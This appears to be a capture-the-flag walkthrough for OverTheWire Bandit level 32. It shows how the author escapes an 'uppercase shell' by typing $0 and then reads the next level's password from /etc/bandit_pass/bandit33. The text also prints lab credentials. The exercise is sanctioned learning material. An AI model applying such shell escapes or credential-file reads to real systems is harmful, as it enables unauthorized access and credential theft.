
#Level 32
Connect to game via ssh on port 2220 using credentials bandit32:56a9bf19c63d650ce78e6ec0354ee45e
_(format username:password)_
```sh
$ ssh -p 2220 bandit32@bandit.labs.overthewire.org
```
#Level Goal
After all this git stuff its time for another escape. Good luck!

**Commands you may need to solve this level**
sh, man

#Walkthrough
Once logged in I tried some commands but all were converted to uppercase and did not run. Also tried hex and unicode but to no avail. When looking closer at output I notice that each string is attempted to be executed with sh.

```sh
>> 0x6c0x73
sh: 1: 0X6C0X73: not found
>> man
sh: 1: MAN: not found
>> $HOME
sh: 1: /home/bandit32: Permission denied
```
The variable shows different error which is promissing. 

```sh
>> $SHELL
WELCOME TO THE UPPERCASE SHELL
>> $_
>> $0
$ 
$ ls -al
total 28
drwxr-xr-x  2 root     root     4096 May  7  2020 .
drwxr-xr-x 41 root     root     4096 May  7  2020 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
-rwsr-x---  1 bandit33 bandit32 7556 May  7  2020 uppershell
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```
We found that $0 gave us actual sh shell.